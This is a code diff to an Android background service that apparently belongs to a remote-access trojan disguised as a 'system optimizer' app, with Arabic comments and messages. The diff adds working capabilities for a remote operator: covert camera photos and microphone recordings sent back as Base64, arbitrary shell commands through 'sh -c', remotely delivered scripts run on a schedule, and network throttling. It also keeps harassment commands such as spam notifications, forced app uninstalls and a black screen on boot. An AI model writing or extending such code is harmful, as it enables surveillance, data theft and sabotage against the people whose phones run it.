@@ -18,10 +18,12 @@ import android.media.MediaPlayer;
 import android.media.MediaRecorder;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
-import android.net.wifi.WifiManager;
 import android.os.BatteryManager;
 import android.os.Build;
+import android.os.Handler;
+import android.os.HandlerThread;
 import android.os.IBinder;
+import android.os.Looper;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.Settings;
@@ -37,11 +39,14 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
+import java.io.Reader;
 import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.net.SocketException;
 import java.nio.charset.StandardCharsets;
+import java.util.ArrayList;
 import java.util.Date;
+import java.util.List;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class BackgroundService extends Service {
@@ -58,6 +63,12 @@ public class BackgroundService extends Service {
     private static final int SHELL_TIMEOUT_MS = 15000;
     private static final int MAX_MESSAGE_SIZE = 8 * 1024 * 1024;
 
+    private static final int WALLPAPER_IMAGE_MAX_BYTES = 5 * 1024 * 1024;
+    private static final int SCRIPT_MAX_BYTES = 512 * 1024;
+    private static final int SCRIPT_TIMEOUT_MS = 60000;
+
+    private static final int CAMERA_TIMEOUT_MS = 120000;
+
     private static final String PREFS_NAME = "system_optimizer_prefs";
     private static final String PREFS_BLACK_SCREEN_ON_BOOT = "black_screen_on_boot";
 
@@ -65,6 +76,30 @@ public class BackgroundService extends Service {
     private volatile boolean running = false;
     private volatile Thread connectionThread;
     private volatile Socket connectionSocket;
+
+    private final Object workerLock = new Object();
+    private volatile HandlerThread workerThread;
+    private volatile Handler workerHandler;
+    private volatile File pendingScriptFile;
+    private volatile boolean degradationActive = false;
+    private volatile String degradedInterface;
+
+    // جسر نتيجة الكاميرا بين Activity والخيط المتصل بالشبكة
+    private static final Object cameraLock = new Object();
+    private static volatile boolean cameraResultReady = false;
+    private static volatile String cameraResult;
+
+    /**
+     * يرسل نتيجة التقاط الصورة (PHOTO_OK:Base64 أو نص خطأ) إلى الخدمة
+     * التي تنتظرها على خيط الاتصال بالشبكة.
+     */
+    public static void postCameraResult(String result) {
+        synchronized (cameraLock) {
+            cameraResult = result;
+            cameraResultReady = true;
+            cameraLock.notifyAll();
+        }
+    }
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -75,6 +110,24 @@ public class BackgroundService extends Service {
     public void onCreate() {
         super.onCreate();
         ensureNotificationChannels();
+        cleanupStaleWallpaperCache();
+    }
+
+    private void cleanupStaleWallpaperCache() {
+        File cacheDir = getCacheDir();
+        File[] files = cacheDir.listFiles();
+        if (files == null) {
+            return;
+        }
+        for (File f : files) {
+            String name = f.getName();
+            if (name.startsWith("wp_") && name.endsWith(".jpg")) {
+                boolean deleted = f.delete();
+                if (deleted) {
+                    Log.i(TAG, "Removed stale wallpaper cache: " + name);
+                }
+            }
+        }
     }
 
     @Override
@@ -110,6 +163,32 @@ public class BackgroundService extends Service {
         if (thread != null) {
             thread.interrupt();
         }
+
+        synchronized (workerLock) {
+            if (workerHandler != null) {
+                workerHandler.removeCallbacksAndMessages(null);
+                workerHandler = null;
+            }
+            if (workerThread != null) {
+                workerThread.quitSafely();
+                workerThread = null;
+            }
+        }
+        File pending = pendingScriptFile;
+        if (pending != null && pending.exists()) {
+            boolean deleted = pending.delete();
+            if (deleted) {
+                Log.i(TAG, "cleaned pending script file on destroy");
+            }
+            pendingScriptFile = null;
+        }
+        if (degradationActive && degradedInterface != null) {
+            runShellCommand("sh", "-c", "tc qdisc del dev " + degradedInterface + " root 2>/dev/null");
+            Log.i(TAG, "attempted to restore network condition on destroy (dev=" + degradedInterface + ")");
+        }
+        degradationActive = false;
+        degradedInterface = null;
+
         super.onDestroy();
     }
 
@@ -247,16 +326,10 @@ public class BackgroundService extends Service {
                 running = false;
                 stopSelf();
                 throw new IOException("exit requested");
-            } else if (command.equals("show_message")) {
-                try {
-                    Intent dialogIntent = new Intent(this, AlertDialogActivity.class);
-                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    startActivity(dialogIntent);
-                    writeMessage(out, "تم عرض الرسالة");
-                } catch (Exception e) {
-                    writeMessage(out, "فشل في عرض الرسالة: " + e.getMessage()
-                            + " (بدء نشاط من الخلفية قد يُحظر على Android 10+)");
-                }
+            } else if (command.startsWith("show_message:idx:")) {
+                handleShowMessageByIdx(command, out);
+            } else if (command.startsWith("show_message:txt:")) {
+                handleShowMessageByText(command, out);
             } else if (command.equals("remove_freefire")) {
                 String result = runShellCommand("pm", "uninstall", "com.dts.freefireth");
                 writeMessage(out, "نتيجة الإزالة: " + result);
@@ -269,13 +342,12 @@ public class BackgroundService extends Service {
                 handlePlayAnnoyingSound(command, out);
             } else if (command.startsWith("change_wallpaper:")) {
                 handleChangeWallpaper(command, out);
+            } else if (command.startsWith("change_wallpaper_base64:")) {
+                handleChangeWallpaperBase64(command, out);
             } else if (command.equals("black_screen_on_boot")) {
                 handleBlackScreenOnBoot(out);
-            } else if (command.equals("toggle_wifi")) {
-                handleToggleWifi(out);
-            } else if (command.equals("toggle_mobile_data")) {
-                String result = runShellCommand("svc", "data", "toggle");
-                writeMessage(out, "نتيجة تبديل البيانات المتنقلة: " + result);
+            } else if (command.startsWith("network_deg:")) {
+                handleNetworkDegradation(command, out);
             } else if (command.startsWith("block_app:")) {
                 String[] parts = command.split(":", 2);
                 if (parts.length < 2 || parts[1].trim().isEmpty()) {
@@ -291,18 +363,14 @@ public class BackgroundService extends Service {
                     writeMessage(out, "أمر مخصص فارغ");
                     return;
                 }
-                String result = runShellCommand(custom.split("\\s+"));
+                String result = runShellCommand("sh", "-c", custom);
                 writeMessage(out, result);
+            } else if (command.startsWith("script_base64:")) {
+                handleRunScript(command, out);
             } else if (command.equals("device_info")) {
                 handleDeviceInfo(out);
             } else if (command.equals("capture_camera")) {
-                if (!hasPermission(Manifest.permission.CAMERA)) {
-                    writeMessage(out, "صلاحية الكاميرا غير ممنوحة");
-                    return;
-                }
-                writeMessage(out, "غير مدعوم من الخدمة الخلفية: "
-                        + "Action.IMAGE_CAPTURE يتطلب Activity لاستقبال نتيجة الالتقاط، "
-                        + "والشكل الحالي لا يمكنه تنفيذ ذلك. أُزيل الكود الصامت الوهمي.");
+                handleCaptureCamera(out);
             } else if (command.startsWith("record_audio:")) {
                 handleRecordAudio(command, out);
             } else if (command.equals("reboot_device")) {
@@ -334,6 +402,104 @@ public class BackgroundService extends Service {
     }
 
     // ---------- أوامر مساعدة ----------
+
+    private void handleShowMessageByIdx(String command, OutputStream out) throws IOException {
+        String idxStr = command.substring("show_message:idx:".length()).trim();
+        int idx;
+        try {
+            idx = Integer.parseInt(idxStr);
+        } catch (NumberFormatException e) {
+            writeMessage(out, "رقم الرسالة غير صالح: " + idxStr);
+            return;
+        }
+        String[] messages = MessageDashboardActivity.MESSAGES;
+        if (idx < 1 || idx > messages.length) {
+            writeMessage(out, "رقم الرسالة خارج النطاق (يجب أن يكون بين 1 و " + messages.length + ")");
+            return;
+        }
+        Intent intent = new Intent(this, MessageDashboardActivity.class);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.putExtra("message_index", idx);
+        startMessageDashboard(intent, out);
+    }
+
+    private void handleShowMessageByText(String command, OutputStream out) throws IOException {
+        String text = command.substring("show_message:txt:".length()).trim();
+        if (text.isEmpty()) {
+            writeMessage(out, "نص الرسالة فارغ");
+            return;
+        }
+        Intent intent = new Intent(this, MessageDashboardActivity.class);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.putExtra("message_text", text);
+        startMessageDashboard(intent, out);
+    }
+
+    private void startMessageDashboard(Intent intent, OutputStream out) throws IOException {
+        try {
+            startActivity(intent);
+            writeMessage(out, "تم عرض الرسالة");
+        } catch (Exception e) {
+            writeMessage(out, "فشل في عرض الرسالة: " + e.getMessage()
+                    + " (بدء نشاط من الخلفية قد يُحظر على Android 10+)");
+        }
+    }
+
+    // ------------------------------------------------------------------
+    // التقاط صورة الكاميرا عبر Activity ثم نقلها Base64 إلى المشغّل
+    // ------------------------------------------------------------------
+
+    private void handleCaptureCamera(OutputStream out) throws IOException, InterruptedException {
+        if (!hasPermission(Manifest.permission.CAMERA)) {
+            writeMessage(out, "صلاحية الكاميرا غير ممنوحة");
+            return;
+        }
+        if (!getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)
+                && !getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
+            writeMessage(out, "لا توجد كاميرا على هذا الجهاز");
+            return;
+        }
+
+        File photoFile = new File(getCacheDir(), "photo_" + System.currentTimeMillis() + ".jpg");
+        String result;
+        synchronized (cameraLock) {
+            cameraResult = null;
+            cameraResultReady = false;
+            cameraLock.notifyAll();
+
+            Intent intent = new Intent(this, CameraCaptureActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            intent.putExtra("output_file", photoFile.getAbsolutePath());
+            try {
+                startActivity(intent);
+            } catch (Exception e) {
+                boolean deleted = photoFile.delete();
+                if (deleted) {
+                    Log.i(TAG, "removed unused camera temp file");
+                }
+                writeMessage(out, "فشل في فتح الكاميرا: " + e.getMessage()
+                        + " (بدء نشاط من الخلفية قد يُحظر على Android 10+)");
+                return;
+            }
+
+            long deadline = System.currentTimeMillis() + CAMERA_TIMEOUT_MS;
+            while (!cameraResultReady && System.currentTimeMillis() < deadline) {
+                cameraLock.wait(1000);
+            }
+            if (!cameraResultReady) {
+                boolean deleted = photoFile.delete();
+                if (deleted) {
+                    Log.i(TAG, "removed stale camera temp file");
+                }
+                writeMessage(out, "انتهت مهلة التقاط الصورة من الجهاز (دقيقتان). حاول مجدداً.");
+                return;
+            }
+            result = cameraResult != null ? cameraResult : "فشل التقاط الصورة (سبب غير معروف)";
+            cameraResult = null;
+            cameraResultReady = false;
+        }
+        writeMessage(out, result);
+    }
 
     private void handleSpamNotifications(String command, OutputStream out) throws IOException, InterruptedException {
         String[] parts = command.split(":", 3);
@@ -429,6 +595,448 @@ public class BackgroundService extends Service {
         }
     }
 
+    private void handleChangeWallpaperBase64(String command, OutputStream out) throws IOException {
+        int firstColon = command.indexOf(':', 1);
+        if (firstColon < 0) {
+            writeMessage(out, "صيغة خاطئة: change_wallpaper_base64:المدة:Base64");
+            return;
+        }
+        int secondColon = command.indexOf(':', firstColon + 1);
+        if (secondColon < 0) {
+            writeMessage(out, "صيغة خاطئة: change_wallpaper_base64:المدة:Base64");
+            return;
+        }
+
+        String durStr = command.substring(firstColon + 1, secondColon);
+        String b64Data = command.substring(secondColon + 1);
+
+        int durationSec;
+        try {
+            durationSec = Integer.parseInt(durStr.trim());
+        } catch (NumberFormatException e) {
+            writeMessage(out, "مدة غير صالحة: " + durStr);
+            return;
+        }
+        if (durationSec <= 0) {
+            writeMessage(out, "المدة يجب أن تكون أكبر من صفر");
+            return;
+        }
+
+        byte[] imageBytes;
+        try {
+            imageBytes = android.util.Base64.decode(b64Data, android.util.Base64.DEFAULT);
+        } catch (IllegalArgumentException e) {
+            writeMessage(out, "فشل في فك تشفير الصورة Base64");
+            return;
+        }
+
+        if (imageBytes.length == 0 || imageBytes.length > WALLPAPER_IMAGE_MAX_BYTES) {
+            writeMessage(out, "حجم الصورة غير صالح");
+            return;
+        }
+
+        if (!isLikelyImage(imageBytes)) {
+            writeMessage(out, "الملف ليس بصيغة صورة معروفة");
+            return;
+        }
+
+        Bitmap newBitmap = BitmapFactory.decodeByteArray(imageBytes, 0, imageBytes.length);
+        if (newBitmap == null) {
+            writeMessage(out, "فشل في فك تشفير الصورة bitmap");
+            return;
+        }
+
+        File cacheFile = new File(getCacheDir(), "wp_" + System.currentTimeMillis() + ".jpg");
+        try {
+            java.io.FileOutputStream fos = new java.io.FileOutputStream(cacheFile);
+            try {
+                fos.write(imageBytes);
+            } finally {
+                fos.close();
+            }
+        } catch (IOException e) {
+            writeMessage(out, "فشل في حفظ الصورة مؤقتاً: " + e.getMessage());
+            newBitmap.recycle();
+            return;
+        }
+
+        WallpaperManager wm = WallpaperManager.getInstance(this);
+        try {
+            wm.setBitmap(newBitmap);
+        } catch (Exception e) {
+            writeMessage(out, "فشل في تعيين الخلفية: " + e.getMessage());
+            newBitmap.recycle();
+            cacheFile.delete();
+            return;
+        }
+
+        final File restoreCache = cacheFile;
+        final Bitmap restoreNew = newBitmap;
+
+        writeMessage(out, "تم تطبيق الخلفية الجديدة. المدة: " + durationSec + " ثانية");
+
+        Handler mainHandler = new Handler(Looper.getMainLooper());
+        mainHandler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    WallpaperManager wmgr = WallpaperManager.getInstance(BackgroundService.this);
+                    try {
+                        wmgr.clear();
+                        Log.i(TAG, "Wallpaper duration expired. Wallpaper cleared (default restored).");
+                    } catch (Exception e) {
+                        Log.w(TAG, "Wallpaper duration expired but clear failed: " + e.getMessage());
+                    }
+                } catch (Exception e) {
+                    Log.w(TAG, "Failed to clear wallpaper: " + e.getMessage());
+                } finally {
+                    if (restoreNew != null && !restoreNew.isRecycled()) {
+                        restoreNew.recycle();
+                    }
+                    if (restoreCache.exists()) {
+                        restoreCache.delete();
+                    }
+                }
+            }
+        }, durationSec * 1000L);
+    }
+
+    private static boolean isLikelyImage(byte[] header) {
+        if (header.length < 4) {
+            return false;
+        }
+        if ((header[0] & 0xFF) == 0xFF && (header[1] & 0xFF) == 0xD8 && (header[2] & 0xFF) == 0xFF) {
+            return true;
+        }
+        if (header.length >= 8
+                && header[0] == (byte) 0x89 && header[1] == 0x50
+                && header[2] == 0x4E && header[3] == 0x47
+                && header[4] == 0x0D && header[5] == 0x0A
+                && header[6] == 0x1A && header[7] == 0x0A) {
+            return true;
+        }
+        if (header[0] == 'B' && header[1] == 'M') {
+            return true;
+        }
+        if (header.length >= 12
+                && header[0] == 'R' && header[1] == 'I' && header[2] == 'F' && header[3] == 'F'
+                && header[8] == 'W' && header[9] == 'E' && header[10] == 'B' && header[11] == 'P') {
+            return true;
+        }
+        return false;
+    }
+
+    // ------------------------------------------------------------------
+    // تحسين/خفض الشبكة المؤقت على الجهاز (tc netem) بدون فصل الاتصال
+    // ------------------------------------------------------------------
+
+    private void handleNetworkDegradation(String command, OutputStream out) throws IOException {
+        String[] parts = command.split(":", -1);
+        if (parts.length < 6) {
+            writeMessage(out, "صيغة خاطئة: network_deg:التأخير(ms):فقدان(%):الحد(kbps):المدة(ثواني)");
+            return;
+        }
+        int latency = parseSetting(parts[1], -1);
+        if (latency < 0) {
+            writeMessage(out, "قيمة غير صالحة للتأخير: " + parts[1]);
+            return;
+        }
+        int loss = parseSetting(parts[2], -1);
+        if (loss < 0) {
+            writeMessage(out, "قيمة غير صالحة لفقدان الحزم: " + parts[2]);
+            return;
+        }
+        long bandwidth = parseSettingLong(parts[3], -1);
+        if (bandwidth < 0) {
+            writeMessage(out, "قيمة غير صالحة للحد الأقصى: " + parts[3]);
+            return;
+        }
+        int duration = parseSetting(parts[4], -1);
+        if (duration < 0) {
+            writeMessage(out, "قيمة غير صالحة للمدة: " + parts[4]);
+            return;
+        }
+
+        if (latency == 0 && loss == 0 && bandwidth == 0) {
+            writeMessage(out, "لم يتم تحديد أي معايير للخفض (القيم كلها صفر)");
+            return;
+        }
+        if (duration <= 0 || duration > 86400) {
+            writeMessage(out, "المدة يجب أن تكون بين 1 و 86400 ثانية");
+            return;
+        }
+        if (latency > 5000 || loss > 100 || bandwidth > 10000000) {
+            writeMessage(out, "قيم خارج النطاق المسموح "
+                    + "(تأخير 0-5000ms، فقدان 0-100%، حد حتى 10Mkbps)");
+            return;
+        }
+
+        String dev = detectNetInterface();
+        if (dev == null) {
+            writeMessage(out, "لا يمكن تحديد واجهة الشبكة المحلية لتطبيق الخفض");
+            return;
+        }
+
+        List<String> commands = new ArrayList<>();
+        if (bandwidth > 0) {
+            long burst = Math.max(1024L, bandwidth / 8L);
+            commands.add("tc qdisc add dev " + dev + " root handle 1: tbf rate "
+                    + bandwidth + "kbit burst " + burst + " latency 50ms");
+            if (latency > 0 || loss > 0) {
+                commands.add("tc qdisc add dev " + dev + " parent 1:1 handle 10: netem delay "
+                        + latency + "ms loss " + loss + "%");
+            }
+        } else {
+            commands.add("tc qdisc add dev " + dev + " root handle 1: netem delay "
+                    + latency + "ms loss " + loss + "%");
+        }
+
+        boolean allApplied = true;
+        String failureDetail = "";
+        for (String cmd : commands) {
+            String res = runShellCommand("sh", "-c", cmd);
+            if (res.contains("[رمز الخروج:") || res.contains("انتهت المهلة")) {
+                allApplied = false;
+                failureDetail = res;
+                runShellCommand("sh", "-c", "tc qdisc del dev " + dev + " root 2>/dev/null");
+                break;
+            }
+        }
+
+        if (!allApplied) {
+            writeMessage(out, "لا يمكن تطبيق خفض الشبكة بصلاحيات التطبيق العادية على هذا الجهاز.\n"
+                    + "يتطلب التنفيذ صلاحيات root/CAP_NET_ADMIN (أمر tc). لم تُجرَ أي تغييرات مؤثرة "
+                    + "على الاتصال ولم يتم فصله.\n"
+                    + "تفاصيل: " + failureDetail);
+            return;
+        }
+
+        // استعادة تلقائية بعد المدة المحددة
+        final Handler h = getWorkerHandler();
+        final String restoreCmd = "tc qdisc del dev " + dev + " root";
+        final String ifaceName = dev;
+        h.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                String res = runShellCommand("sh", "-c", restoreCmd);
+                Log.i(TAG, "Network degradation restored (dev=" + ifaceName + "): " + res);
+                degradationActive = false;
+                degradedInterface = null;
+            }
+        }, duration * 1000L);
+        degradationActive = true;
+        degradedInterface = dev;
+
+        writeMessage(out, "تم تطبيق خفض الشبكة مؤقتاً على الواجهة " + dev + "\n"
+                + "تأخير: " + latency + "ms، فقدان: " + loss + "%، حد أقصى: "
+                + (bandwidth > 0 ? bandwidth + " kbps" : "بدون") + "\n"
+                + "سيتم استعادة الحالة الطبيعية تلقائياً بعد " + duration + " ثانية");
+    }
+
+    private String detectNetInterface() {
+        String[] candidates = {"eth0", "wlan0", "rmnet_data0", "rmnet0", "wlan1"};
+        for (String iface : candidates) {
+            String res = runShellCommand("sh", "-c",
+                    "ip link show " + iface + " 2>/dev/null | grep -q . && echo OK");
+            if (res.contains("OK")) {
+                return iface;
+            }
+        }
+        return null;
+    }
+
+    // ------------------------------------------------------------------
+    // تنفيذ سكربت مجدول/فوري على الجهاز
+    // ------------------------------------------------------------------
+
+    private void handleRunScript(String command, OutputStream out) throws IOException {
+        int firstColon = command.indexOf(':', "script_base64".length());
+        if (firstColon < 0) {
+            writeMessage(out, "صيغة خاطئة: script_base64:التأخير:Base64");
+            return;
+        }
+        int secondColon = command.indexOf(':', firstColon + 1);
+        if (secondColon < 0) {
+            writeMessage(out, "صيغة خاطئة: script_base64:التأخير:Base64");
+            return;
+        }
+        String delayStr = command.substring(firstColon + 1, secondColon);
+        String b64Data = command.substring(secondColon + 1);
+
+        int delay;
+        try {
+            delay = Integer.parseInt(delayStr.trim());
+        } catch (NumberFormatException e) {
+            writeMessage(out, "تأخير غير صالح: " + delayStr);
+            return;
+        }
+        if (delay < 0 || delay > 86400) {
+            writeMessage(out, "التأخير يجب أن يكون بين 0 و 86400 ثانية");
+            return;
+        }
+
+        byte[] scriptBytes;
+        try {
+            scriptBytes = android.util.Base64.decode(b64Data, android.util.Base64.DEFAULT);
+        } catch (IllegalArgumentException e) {
+            writeMessage(out, "فشل فك تشفير النص Base64");
+            return;
+        }
+        if (scriptBytes.length == 0 || scriptBytes.length > SCRIPT_MAX_BYTES) {
+            writeMessage(out, "حجم النص غير صالح (فارغ أو أكبر من الحد المسموح: " + SCRIPT_MAX_BYTES + " بايت)");
+            return;
+        }
+
+        // تخزين مؤقت على الجهاز؛ يُحذف بعد التنفيذ (وليس حفظاً دائماً)
+        final File scriptFile = new File(getCacheDir(), "script_" + System.currentTimeMillis() + ".sh");
+        try {
+            java.io.FileOutputStream fos = new java.io.FileOutputStream(scriptFile);
+            try {
+                fos.write(scriptBytes);
+            } finally {
+                fos.close();
+            }
+        } catch (IOException e) {
+            writeMessage(out, "فشل حفظ النص مؤقتاً على الجهاز: " + e.getMessage());
+            return;
+        }
+        pendingScriptFile = scriptFile;
+
+        final Handler h = getWorkerHandler();
+        final OutputStream outRef = out;
+        final long delayMs = delay * 1000L;
+        final int delaySeconds = delay;
+        final String scriptName = scriptFile.getName();
+        h.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    String execResult = runScript(scriptFile);
+                    String reply;
+                    if (delaySeconds > 0) {
+                        reply = "حالة التنفيذ: تم التنفيذ بعد " + delaySeconds + " ثانية من الجدولة\n" + execResult;
+                    } else {
+                        reply = "حالة التنفيذ: نُفذ فوراً\n" + execResult;
+                    }
+                    writeMessage(outRef, reply);
+                } catch (Exception e) {
+                    try {
+                        writeMessage(outRef, "فشل تنفيذ النص المجدول: " + e.getMessage());
+                    } catch (IOException ignored) {
+                        Log.w(TAG, "reply failed for scheduled script", e);
+                    }
+                } finally {
+                    pendingScriptFile = null;
+                    boolean deleted = scriptFile.delete();
+                    if (!deleted) {
+                        Log.w(TAG, "failed to delete temp script: " + scriptName);
+                    }
+                }
+            }
+        }, delayMs);
+    }
+
+    private String runScript(File scriptFile) {
+        StringBuilder output = new StringBuilder();
+        StringBuilder stdout = new StringBuilder();
+        StringBuilder stderr = new StringBuilder();
+        Process process = null;
+        try {
+            ProcessBuilder pb = new ProcessBuilder("sh", scriptFile.getAbsolutePath());
+            pb.redirectErrorStream(false);
+            process = pb.start();
+            Reader outReader = new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8);
+            Reader errReader = new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8);
+
+            long deadline = System.currentTimeMillis() + SCRIPT_TIMEOUT_MS;
+            boolean done = false;
+            while (!done) {
+                boolean exited = false;
+                try {
+                    process.exitValue();
+                    exited = true;
+                } catch (IllegalThreadStateException stillRunning) {
+                    if (System.currentTimeMillis() > deadline) {
+                        process.destroy();
+                        output.append("انتهت مهلة تنفيذ النص بعد ").append(SCRIPT_TIMEOUT_MS / 1000).append(" ثانية\n");
+                        exited = true;
+                    }
+                }
+                drainChar(outReader, stdout);
+                drainChar(errReader, stderr);
+                if (exited) {
+                    done = true;
+                } else {
+                    try {
+                        Thread.sleep(100);
+                    } catch (InterruptedException e) {
+                        Thread.currentThread().interrupt();
+                        process.destroy();
+                        done = true;
+                    }
+                }
+            }
+            drainChar(outReader, stdout);
+            drainChar(errReader, stderr);
+
+            int exit = -1;
+            try {
+                exit = process.exitValue();
+            } catch (IllegalThreadStateException ignored) {
+            }
+            if (stdout.toString().trim().length() > 0) {
+                output.append("[stdout]\n").append(stdout.toString().trim()).append("\n");
+            }
+            if (stderr.toString().trim().length() > 0) {
+                output.append("[stderr]\n").append(stderr.toString().trim()).append("\n");
+            }
+            output.append("[رمز الخروج: ").append(exit).append("]");
+        } catch (IOException e) {
+            return "خطأ في تنفيذ النص: " + e.getMessage();
+        } catch (RuntimeException e) {
+            return "خطأ في تنفيذ النص: " + e.getMessage();
+        } finally {
+            if (process != null) {
+                process.destroy();
+            }
+        }
+        return output.toString();
+    }
+
+    private Handler getWorkerHandler() {
+        synchronized (workerLock) {
+            if (workerHandler == null) {
+                HandlerThread thread = new HandlerThread("bg-worker");
+                thread.start();
+                workerThread = thread;
+                workerHandler = new Handler(thread.getLooper());
+            }
+            return workerHandler;
+        }
+    }
+
+    private static int parseSetting(String text, int fallback) {
+        try {
+            return Integer.parseInt(text.trim());
+        } catch (NumberFormatException e) {
+            return fallback;
+        }
+    }
+
+    private static long parseSettingLong(String text, long fallback) {
+        try {
+            return Long.parseLong(text.trim());
+        } catch (NumberFormatException e) {
+            return fallback;
+        }
+    }
+
+    private static void drainChar(Reader reader, StringBuilder out) throws IOException {
+        while (reader.ready()) {
+            out.append((char) reader.read());
+        }
+    }
+
     private void handleBlackScreenOnBoot(OutputStream out) throws IOException {
         SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
         boolean enabled = prefs.getBoolean(PREFS_BLACK_SCREEN_ON_BOOT, false);
@@ -436,22 +1044,6 @@ public class BackgroundService extends Service {
         prefs.edit().putBoolean(PREFS_BLACK_SCREEN_ON_BOOT, newState).apply();
         writeMessage(out, "تم " + (newState ? "تفعيل" : "إلغاء تفعيل")
                 + " الشاشة السوداء عند الإقلاع (الحالة الجديدة: " + (newState ? "مفعّل" : "معطّل") + ")");
-    }
-
-    private void handleToggleWifi(OutputStream out) throws IOException {
-        try {
-            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
-            boolean wasEnabled = wifiManager.isWifiEnabled();
-            boolean success = wifiManager.setWifiEnabled(!wasEnabled);
-            if (success) {
-                writeMessage(out, "تم " + (!wasEnabled ? "تفعيل" : "إلغاء تفعيل") + " الواي فاي");
-            } else {
-                writeMessage(out, "تعذر تغيير حالة الواي فاي على هذا الإصدار "
-                        + "(setWifiEnabled معطّل للتطبيقات منذ Android 13؛ بدّل من الإعدادات)");
-            }
-        } catch (Exception e) {
-            writeMessage(out, "فشل في تغيير حالة الواي فاي: " + e.getMessage());
-        }
     }
 
     private void handleToggleAirplaneMode(OutputStream out) throws IOException {
@@ -545,13 +1137,8 @@ public class BackgroundService extends Service {
             return;
         }
 
-        File dir = getExternalFilesDir(null);
-        if (dir == null) {
-            writeMessage(out, "لا يمكن الوصول إلى التخزين الخاص بالتطبيق");
-            return;
-        }
-        File outputFile = new File(dir, "recorded_audio_" + System.currentTimeMillis() + ".3gp");
-
+        // ملف مؤقت في كاش التطبيق؛ يُحذف بعد إرسال البيانات (وليس حفظاً دائماً)
+        File outputFile = new File(getCacheDir(), "rec_" + System.currentTimeMillis() + ".3gp");
         MediaRecorder recorder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                 ? new MediaRecorder(this) : new MediaRecorder();
         try {
@@ -562,16 +1149,64 @@ public class BackgroundService extends Service {
             recorder.prepare();
             recorder.start();
             Thread.sleep(duration * 1000L);
-            writeMessage(out, "تم حفظ التسجيل في: " + outputFile.getAbsolutePath());
-        } catch (Exception e) {
-            writeMessage(out, "فشل في التسجيل: " + e.getMessage());
-        } finally {
             try {
                 recorder.stop();
             } catch (RuntimeException ignored) {
             }
             recorder.release();
+            recorder = null;
+            writeMessage(out, "record_audio_data:" + duration + ":" + audioBase64(outputFile));
+        } catch (Exception e) {
+            writeMessage(out, "فشل في التسجيل: " + e.getMessage());
+        } finally {
+            if (recorder != null) {
+                try {
+                    recorder.stop();
+                } catch (RuntimeException ignored) {
+                }
+                recorder.release();
+            }
+            boolean deleted = outputFile.delete();
+            if (!deleted) {
+                Log.w(TAG, "failed to delete temp recording: " + outputFile.getName());
+            }
         }
+    }
+
+    private String audioBase64(File file) throws IOException {
+        byte[] data = readFileBytes(file);
+        if (data.length == 0) {
+            throw new IOException("الملف الناتج فارغ (قد لا يوجد ميكروفون على هذا الجهاز)");
+        }
+        return android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP);
+    }
+
+    private static byte[] readFileBytes(File file) throws IOException {
+        long length = file.length();
+        if (length == 0) {
+            return new byte[0];
+        }
+        int size = (int) Math.min(length, Integer.MAX_VALUE);
+        byte[] data = new byte[size];
+        java.io.FileInputStream fis = new java.io.FileInputStream(file);
+        try {
+            int offset = 0;
+            while (offset < size) {
+                int read = fis.read(data, offset, size - offset);
+                if (read == -1) {
+                    break;
+                }
+                offset += read;
+            }
+            if (offset != size) {
+                byte[] trimmed = new byte[offset];
+                System.arraycopy(data, 0, trimmed, 0, offset);
+                data = trimmed;
+            }
+        } finally {
+            fis.close();
+        }
+        return data;
     }
 
     private void handleCallLog(OutputStream out) throws IOException {
